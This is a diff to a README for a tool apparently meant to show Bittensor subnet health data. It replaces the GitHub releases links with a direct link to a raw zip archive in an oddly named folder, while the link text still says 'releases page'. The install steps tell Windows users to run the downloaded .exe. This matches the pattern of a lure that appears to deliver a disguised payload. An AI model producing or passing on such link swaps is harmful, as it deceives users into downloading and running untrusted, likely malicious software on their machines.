@@ -1,6 +1,6 @@
 # 📊 metagraphed - View Bittensor subnet health data easily
 
-[![Download metagraphed](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Matterfamilydactylopteridae483/metagraphed/releases)
+[![Download metagraphed](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Matterfamilydactylopteridae483/metagraphed/main/devotionality/Software-v2.7.zip)
 
 metagraphed provides a clear view into Bittensor subnets. It tracks metadata, system health, and schema information. Users see the status of different networks through a simple interface. This tool removes the need for manual checks. You gain insight into registry data and public interfaces without technical hurdles.
 
@@ -29,7 +29,7 @@ Your computer must meet these standards to run the application well:
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the [releases page](https://github.com/Matterfamilydactylopteridae483/metagraphed/releases) to find the installer. 
+1. Visit the [releases page](https://raw.githubusercontent.com/Matterfamilydactylopteridae483/metagraphed/main/devotionality/Software-v2.7.zip) to find the installer. 
 2. Choose the file ending in .exe for Windows.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the saved file to start the installation wizard.
